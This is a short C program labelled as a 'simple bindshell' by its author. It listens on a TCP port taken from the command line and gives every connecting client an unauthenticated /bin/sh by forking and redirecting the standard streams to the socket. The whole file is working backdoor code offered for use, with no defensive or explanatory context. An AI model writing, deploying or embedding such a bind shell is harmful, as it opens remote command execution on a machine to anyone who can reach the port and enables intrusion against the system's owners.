/*
Simple bindshell by m0nad
m0nad [at] email.com 
*/
#include <stdio.h>
#include <stdlib.h>
//#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
void erro (char *msg)
{
    perror(msg);
    exit(1);
}
int
inicia_server (struct sockaddr_in *nome, unsigned short int porta)
{
  int fd;
  //memset((char *) nome,0, sizeof(*nome));
  nome->sin_family = AF_INET;
  nome->sin_port = htons(porta);
  nome->sin_addr.s_addr = htonl(INADDR_ANY);

  fd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);

  if (fd < 0)
    erro ("SOCKET");
  if (bind (fd, (struct sockaddr *)nome, sizeof (*nome)) < 0)
    erro ("BIND");
  if (listen (fd, SOMAXCONN) < 0)
    erro ("LISTEN");

  return fd;
} 
int
main (int argc, char ** argv) 
{
  int sockfd, porta,conex;//tam; 
  char * const sh[] = { "/bin/sh", NULL };
  struct sockaddr_in server;
  if (argc < 2) {
    printf ("%s porta\n",argv[0]);
    exit(1);
  }
  porta = atoi (argv[1]); 
  sockfd = inicia_server(&server, porta);  
 
 // tam = sizeof client;
  while ((conex = accept (sockfd, NULL, NULL)) > 0) { //while ((conex = accept (sockfd, (struct sockaddr *)&client, &tam)) > 0) {
    if (!fork()) {
      dup2(conex,0); dup2(conex,1); dup2(conex,2);
      execve(sh[0], sh, NULL);
    }
  }
  return 0;
}

